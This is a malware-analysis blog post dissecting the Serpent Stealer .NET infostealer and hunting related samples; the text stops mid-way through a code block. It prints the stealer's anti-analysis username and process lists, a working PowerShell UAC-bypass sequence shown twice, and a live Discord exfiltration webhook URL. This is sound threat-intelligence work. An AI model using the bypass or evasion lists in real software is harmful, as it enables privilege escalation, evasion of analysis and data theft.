<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hunt and Analysis - Serpent Stealer" /><meta name="author" content="Tufan Gungor" /><meta property="og:locale" content="en" /><meta name="description" content="Part 1 - Dissecting the First Serpent Stealer Sample" /><meta property="og:description" content="Part 1 - Dissecting the First Serpent Stealer Sample" /><link rel="canonical" href="https://tufan-gungor.github.io/posts/serpent-stealer-analysis/" /><meta property="og:url" content="https://tufan-gungor.github.io/posts/serpent-stealer-analysis/" /><meta property="og:site_name" content="tufan." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-01-06T19:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hunt and Analysis - Serpent Stealer" /><meta name="twitter:site" content="@tufan_gngr" /><meta name="twitter:creator" content="@Tufan Gungor" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Tufan Gungor"},"dateModified":"2024-01-06T19:00:00+03:00","datePublished":"2024-01-06T19:00:00+03:00","description":"Part 1 - Dissecting the First Serpent Stealer Sample","headline":"Hunt and Analysis - Serpent Stealer","mainEntityOfPage":{"@type":"WebPage","@id":"https://tufan-gungor.github.io/posts/serpent-stealer-analysis/"},"url":"https://tufan-gungor.github.io/posts/serpent-stealer-analysis/"}</script><title>Hunt and Analysis - Serpent Stealer | tufan.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="tufan."><meta name="application-name" content="tufan."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/favicons/tufan_logo.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">tufan.</a></div><div class="site-subtitle font-italic">Malware Analysis & Threat Intelligence</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tufan-gungor" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/tufan_gngr" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['tufan.gngr','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hunt and Analysis - Serpent Stealer</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hunt and Analysis - Serpent Stealer</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/tufan_gngr">Tufan Gungor</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1704556800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-01-06 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2324 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h1 id="part-1---dissecting-the-first-serpent-stealer-sample">Part 1 - Dissecting the First Serpent Stealer Sample</h1><p>On October 15, 2023, a new malware named <code class="language-plaintext highlighter-rouge">Serpent Stealer</code> was showcased on <a href="https://breachforums.is/Thread-Serpent-Stealer-1-On-The-Market-Affordable">Breach Forums</a> by a user named <code class="language-plaintext highlighter-rouge">stealth</code>. This malware, categorized as a standard stealer, deviates from the norm in its operational tactics. Unlike others that rely on a command and control (C2) server, the ‘Serpent Stealer’ utilizes a <code class="language-plaintext highlighter-rouge">Discord webhook</code> for its functionality, as highlighted by its developer.</p><p><img data-src="/assets/img/serpent/1.png" alt="Untitled" data-proofer-ignore></p><p>An extensive search on VirusTotal using keywords such as <code class="language-plaintext highlighter-rouge">SerpentStealer</code> led to the discovery of the first sample of Serpent Stealer, known by the filename <code class="language-plaintext highlighter-rouge">Serpent.dll</code> This sample was first recorded on October 12, 2023. In the first part of our article, we delve into an in-depth analysis of this particular file, unraveling its characteristics and behavior.</p><p><strong>SHA256: <em>5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357d</em></strong></p><p><em>Exeinfo output for Serpent.dll</em></p><p><code class="language-plaintext highlighter-rouge">x64 .NET exe file with : 00 Entry Point - CPU : AMD64 - code size : 34.5 KB</code></p><p>The analysis of ‘Serpent.dll’ began with EXEinfo, which classified it as a .NET file. This led us to examine it in DNSpy, specifically the Main function. Initial observations revealed that the stealer followed a basic, almost ‘copy/paste’ methodology. Remarkably, it was devoid of complexities like obfuscation and encryption, leaving it unprotected and relatively simple in design.</p><p><img data-src="/assets/img/serpent/2.png" alt="Untitled" data-proofer-ignore></p><p>A particular string within the Main function of <code class="language-plaintext highlighter-rouge">Serpent.dll</code> drew our attention; the function <code class="language-plaintext highlighter-rouge">steamClient.GetSteam()</code> included a hardcoded directory path <code class="language-plaintext highlighter-rouge">C:\\Users\\Aperx\\Desktop</code>. This detail suggests that the malware developer might have used this path for testing purposes and inadvertently left it in the code. We plan to leverage this specific string in our subsequent search for related samples.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>C:\\Users\\Aperx\\Desktop
</pre></table></code></div></div><h2 id="anti-analysis-techniques"><span class="mr-2">Anti-Analysis Techniques</span><a href="#anti-analysis-techniques" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The malware incorporates two distinct anti-analysis techniques: <code class="language-plaintext highlighter-rouge">AntiVT</code> and <code class="language-plaintext highlighter-rouge">AntiAV</code>. However, considering that the VirusTotal detection score for this file stands at 41 out of 72, it’s apparent that these functions didn’t perform as effectively as intended.</p><h3 id="1-antivtisvirustotal"><span class="mr-2">1. AntiVT.IsVirusTotal()</span><a href="#1-antivtisvirustotal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/img/serpent/3.png" alt="Untitled" data-proofer-ignore></p><p>In its initial layer of defense, the malware uses an anti-analysis function named <code class="language-plaintext highlighter-rouge">AntiVT.IsVirusTotal()</code>. This function involves a simple yet specific check: it compares the computer’s name with a predefined list of <code class="language-plaintext highlighter-rouge">126 names</code>, all hardcoded by the malware’s creator. Should there be a match with any name in the list, the malware automatically ceases to function. This is a basic tactic to avoid analysis.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
</pre><td class="rouge-code"><pre>"05h00Gi0",
"3u2v9m8",
"43By4",
"4tgiizsLimS",
"6O4KyHhJXBiR",
"7wjlGX7PjlW4",
"8Nl0ColNQ5bq",
"8VizSM",
"Abby",
"Amy",
"AppOnFlySupport",
"ASPNET",
"azure",
"BUiA1hkm",
"BvJChRPnsxn",
"cM0uEGN4do",
"cMkNdS6",
"DefaultAccount",
"dOuyo8RV71",
"DVrzi",
"e60UW",
"ecVtZ5wE",
"EGG0p",
"Frank",
"fred",
"G2DbYLDgzz8Y",
"george",
"GjBsjb",
"Guest",
"h7dk1xPr",
"h86LHD",
"Harry Johnson",
"HEUeRzl",
"hmarc",
"ICQja5iT",
"IVwoKUF",
"j6SHA37KA",
"j7pNjWM",
"John",
"jude",
"Julia",
"kEecfMwgj",
"kFu0lQwgX5P",
"KUv3bT4",
"Lisa",
"lK3zMR",
"lmVwjj9b",
"Louise",
"Lucas",
"mike",
"Mr.None",
"noK4zG7ZhOf",
"o6jdigq",
"o8yTi52T",
"OgJb6GqgK0O",
"patex",
"PateX",
"Paul Jones",
"pf5vj",
"PgfV1X",
"PqONjHVwexsS",
"pWOuqdTDQ",
"PxmdUOpVyx",
"QfofoG",
"QmIS5df7u",
"QORxJKNk",
"qZo9A",
"RDhJ0CNFevzX",
"RGzcBUyrznReg",
"S7Wjuf",
"server",
"SqgFOf3G",
"Steve",
"test",
"TVM",
"txWas1m2t",
"umyUJ",
"Uox1tzaMO",
"User01",
"w0fjuOVmCcP5A",
"WDAGUtilityAccount",
"XMiMmcKziitD",
"xPLyvzr8sgC",
"ykj0egq7fze",
"DdQrgc",
"ryjIJKIrOMs",
"nZAp7UBVaS1",
"zOEsT",
"l3cnbB8Ar5b8",
"xUnUy",
"fNBDSlDTXY",
"vzY4jmH0Jw02",
"gu17B",
"UiQcX",
"21zLucUnfI85",
"OZFUCOD6",
"8LnfAai9QdJR",
"5sIBK",
"rB5BnfuR2",
"GexwjQdjXG",
"IZZuXj",
"ymONofg",
"dxd8DJ7c",
"JAW4Dz0",
"GJAm1NxXVm",
"UspG1y1C",
"equZE3J",
"BXw7q",
"lubi53aN14cU",
"5Y3y73",
"9yjCPsEYIMH",
"GGw8NR",
"JcOtj17dZx",
"05KvAUQKPQ",
"64F2tKIqO5",
"7DBgdxu",
"uHUQIuwoEFU",
"gL50ksOp",
"Of20XqH4VL",
"tHiF2T",
"sal.rosenburg",
"hbyLdJtcKyN1",
"Rt1r7",
"katorres",
"doroth",
"umehunt"
</pre></table></code></div></div><h3 id="2-antiavisavpresent"><span class="mr-2">2. AntiAv.IsAvPresent()</span><a href="#2-antiavisavpresent" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/img/serpent/4.png" alt="Untitled" data-proofer-ignore></p><p>The second anti-analysis function, <code class="language-plaintext highlighter-rouge">AntiAV.IsAvPresent()</code>, operates by cycling through the list of running processes and comparing them with a predefined set of <code class="language-plaintext highlighter-rouge">53 process names</code>. Despite its name suggesting a focus on anti-virus software, this function extends its reach to include various other processes, such as debuggers, malware analysis tools, and virtual machine processes, showcasing a broader scope of detection evasion.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre>"ProcessHacker.exe",
"httpdebuggerui.exe",
"wireshark.exe",
"fiddler.exe",
"regedit.exe",
"cmd.exe",
"taskmgr.exe",
"vboxservice.exe",
"df5serv.exe",
"processhacker.exe",
"vboxtray.exe",
"vmtoolsd.exe",
"vmwaretray.exe",
"ida64.exe",
"ollydbg.exe",
"pestudio.exe",
"vmwareuser.exe",
"vgauthservice.exe",
"vmacthlp.exe",
"vmsrvc.exe",
"x32dbg.exe",
"x64dbg.exe",
"x96dbg.exe",
"vmusrvc.exe",
"prl_cc.exe",
"prl_tools.exe",
"qemu-ga.exe",
"joeboxcontrol.exe",
"ksdumperclient.exe",
"xenservice.exe",
"joeboxserver.exe",
"devenv.exe",
"IMMUNITYDEBUGGER.EXE",
"ImportREC.exe",
"reshacker.exe",
"windbg.exe",
"32dbg.exe",
"64dbg.exex",
"protection_id.exex",
"scylla_x86.exe",
"scylla_x64.exe",
"scylla.exe",
"idau64.exe",
"idau.exe",
"idaq64.exe",
"idaq.exe",
"idaq.exe",
"idaw.exe",
"idag64.exe",
"idag.exe",
"ida64.exe",
"ida.exe",
"ollydbg.exe",
</pre></table></code></div></div><h2 id="uac-bypass"><span class="mr-2">UAC Bypass</span><a href="#uac-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This malware sample employs a UAC (User Account Control) Bypass using three PowerShell commands. The first command creates a new registry entry. The second, adds a new property to this entry, crucial for the bypass mechanism. The third command, sets a specific value to this entry, thus allowing the malware to execute commands without UAC intervention.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">New-Item</span><span class="w"> </span><span class="err">“</span><span class="nx">HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command</span><span class="err">”</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="err">“</span><span class="nx">HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command</span><span class="err">”</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="err">“</span><span class="nx">DelegateExecute</span><span class="err">”</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="err">“”</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="err">“</span><span class="nx">HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command</span><span class="err">”</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="err">“</span><span class="p">(</span><span class="n">default</span><span class="p">)</span><span class="err">”</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="n">\</span><span class="s2">"{0}\"</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="/assets/img/serpent/5.png" alt="Untitled" data-proofer-ignore></p><h2 id="data-exfiltration"><span class="mr-2">Data Exfiltration</span><a href="#data-exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Once it has gathered all the data set to be stolen, the Serpent Stealer initiates a request to <code class="language-plaintext highlighter-rouge">checkip.dyndns.org</code>. This action is undertaken to acquire the public IP address of the infected machine. Subsequently, it proceeds to transmit all the accumulated data to a Discord server, utilizing a webhook for this purpose. This sequence of actions highlights the malware’s methodical approach in executing its data exfiltration process.</p><p><img data-src="/assets/img/serpent/6.png" alt="Untitled" data-proofer-ignore></p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="n">Webhook_link</span> <span class="p">=</span> <span class="s">"https://discord.com/api/webhooks/1156720932375756921/Xu5g1XzMRXTKDzrIOMcPMC1orYzXGQKBYTTRVOX4oR-IbivHh0LzqCucl2b-obrco6jj"</span><span class="p">;</span>
</pre></table></code></div></div><p>This particular sample appears to be from the early stages of development, as evidenced by numerous informative messages within the malware’s code. For instance, lines like</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[+] Program finished."</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[-] Target does not have FTP."</span><span class="p">);</span>
</pre></table></code></div></div><p>suggest a debugging phase. Additionally, as previously mentioned, the hardcoded folder path <code class="language-plaintext highlighter-rouge">C:\Users\Aperx\Desktop</code> left in the malware indicates an oversight. These factors lead to the conclusion that this file was likely not ready for widespread distribution in a malware campaign and was still a work in progress.</p><p>The absence of obfuscation, encryption, or any form of packing in this malware allows for a straightforward understanding of its capabilities just by examining its function names. Due to this simplicity, an in-depth analysis of each function is unnecessary. It is, in essence, a typical copy/paste .NET stealer.</p><h1 id="part-2---hunting-for-new-samples">Part 2 - Hunting for New Samples</h1><p>In Part 2 of our article, focused on Hunting for New Samples, we encounter a variety of specific strings within the ‘Serpent Stealer’ sample. Among these, <code class="language-plaintext highlighter-rouge">C:\\Users\\Aperx\\Desktop</code> emerges as particularly indicative of the developer’s involvement. This string has guided our search efforts.</p><p>Searching <code class="language-plaintext highlighter-rouge">“Users\\Aperx\\”</code> in VirusTotal, we have identified 11 instances that match this criterion. The following is the list of these matches.</p><div class="table-wrapper"><table><thead><tr><th>File Name<th>File Hash<th>Detections<th>First Seen<tbody><tr><td>SerpentPremium.dll<td>382b9a9dcae2166c4b1ec4c2010104c62e2afb170605bd39c0feee622d5d29e9<td>1 / 72<td>2023-12-31<tr><td>RsrcPractice.exe<td>202fca883d2e6db7d7259ed11cbf0b4ba58c5ead3640b5ee09b9aca823a49cb0<td>49 / 72<td>2023-12-01<tr><td>RsrcPractice.exe<td>078d6a0e208fe8ab036aaa62b0f325a2583a7b1a74e7ae50298e0db2b31274ef<td>50 / 72<td>2023-11-30<tr><td>nitrohax.dll<td>ce70fe6f2fb6dc0f1abd000659db50d4bb549210ff8b4850d81c963587d83041<td>3 / 64<td>2023-11-11<tr><td>No name<td>3dd96e139d320c5cd4e7f46ef5fa3d119af54659f7210659a5f91c11db3a3f45<td>20 / 61<td>2023-11-04<tr><td>Nigga.pdf.lnk<td>29e7761575e0a8d4c732a0a0221c90606613b9233be55fb809278a0c4a6e75b6<td>25 / 61<td>2023-11-04<tr><td>Serpent.dll<td>4c6cbc32e63a918cfa0ffc7486fb3210aeb2d9b08e6e4f7976582215acc99c41<td>0 / 72<td>2023-10-25<tr><td>Serpent.dll<td>25c033dd58e3b48b84ec9cb4ffe0c2f9293e7a4b4c81452c49abf7dda61db6ce<td>27 / 71<td>2023-10-19<tr><td>Serpent.dll<td>212c4eba1bf5f695c563668c09cd3399d484d5bd5945edea97dc1ecbfd3a3eed<td>43 / 71<td>2023-10-12<tr><td>Serpent.dll<td>6b82bfbdf2e9666bd0c74280ee20c14044fee9d711ae340c8dc388104695b75d<td>44 / 72<td>2023-10-12<tr><td>Serpent.dll<td>5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357d<td>41 / 72<td>2023-10-12</table></div><h2 id="new-version-analysis"><span class="mr-2">New Version Analysis</span><a href="#new-version-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The sample discovered on October 25, 2023, stands out notably due to its zero detection rate on VirusTotal, drawing our immediate attention. Let’s proceed to analyze this particular sample in detail, exploring its unique attributes and potential implications.</p><p><img data-src="/assets/img/serpent/7.png" alt="Untitled" data-proofer-ignore></p><p>Once more, we find that this file is written in .NET, prompting us to use DNSpy for its analysis. A thorough examination in DNSpy reveals a familiar pattern: the absence of obfuscations or encryptions. Just like its predecessors, it’s a straightforward, cleartext simple stealer, laying bare its functionalities.</p><p><img data-src="/assets/img/serpent/8.png" alt="Untitled" data-proofer-ignore></p><p>This particular sample takes a structured approach to data storage. It establishes a new folder labeled ‘Serpent’ in the Temp path, where it systematically stores the pilfered data. The malware accomplishes this by generating individual files within this folder, each containing a segment of the stolen information.</p><p><img data-src="/assets/img/serpent/9.png" alt="Untitled" data-proofer-ignore></p><p>Comparing this sample with the first, we observe some key differences. Notably, this version lacks any Anti-Analysis mechanisms. Furthermore, it deviates in its data processing methodology – it accumulates data but stops short of exfiltrating it, choosing instead to store it in the ‘%Temp%\Serpent' directory. This pattern leads us to speculate that we might be looking at a test version, not fully equipped for deployment in a malware campaign. Additionally, the lack of data exfiltration likely plays a role in its zero detection status, as it reduces the likelihood of triggering security alerts.</p><h2 id="serpent-premium"><span class="mr-2">Serpent Premium</span><a href="#serpent-premium" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>During our investigative journey on VirusTotal, using <code class="language-plaintext highlighter-rouge">Users\\Aperx\\</code> as our search query, we stumbled upon a file called <code class="language-plaintext highlighter-rouge">SerpentPremium.dll</code>. Given its ‘Serpent’ nomenclature and the shared folder path, there’s a strong indication that we might be dealing with a new iteration of the ‘Serpent Stealer’. We will now delve into an analysis of ‘SerpentPremium.dll’ to explore its characteristics and validate if it is indeed a new variant.</p><p><strong>SHA256: <em>382b9a9dcae2166c4b1ec4c2010104c62e2afb170605bd39c0feee622d5d29e9</em></strong></p><p><img data-src="/assets/img/serpent/10.png" alt="Untitled" data-proofer-ignore></p><p>Upon examining the connections related to <code class="language-plaintext highlighter-rouge">SerpentPremium.dll</code>, we discovered that it was extracted from an archive named <code class="language-plaintext highlighter-rouge">Cobra-main.zip</code>. This finding prompts us to shift our focus to ‘Cobra-main.zip’.</p><p><img data-src="/assets/img/serpent/11.png" alt="Untitled" data-proofer-ignore></p><p>Investigating its associations further, we notice a GitHub link listed under the ‘Memory pattern URLs’ section on VirusTotal. This new lead could unveil additional layers in our exploration of the malware’s origins and associations.</p><p><img data-src="/assets/img/serpent/12.png" alt="Untitled" data-proofer-ignore></p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://github.com/0xSerpent/Cobra
</pre></table></code></div></div><p><img data-src="/assets/img/serpent/13.png" alt="Untitled" data-proofer-ignore></p><p>In the words of its creator, ‘<em>Cobra is a C# Remote Access Tool, made due to the lack of good Remote Access Tools that do not need port forwarding, (and the ones that do exist, sort of suck).</em>’ This tool was co-developed by <code class="language-plaintext highlighter-rouge">0x-Stealth</code> (notably associated with the ‘SerpentStealer’ post on Breach Forums) and <code class="language-plaintext highlighter-rouge">m21acro</code>. Cobra mirrors certain aspects of the Serpent Stealer, notably in its use of the same UAC bypass technique.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kt">string</span> <span class="n">powershellScript</span> <span class="p">=</span> <span class="s">@"
 New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
 New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
 Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value $program -Force
"</span><span class="p">;</span>
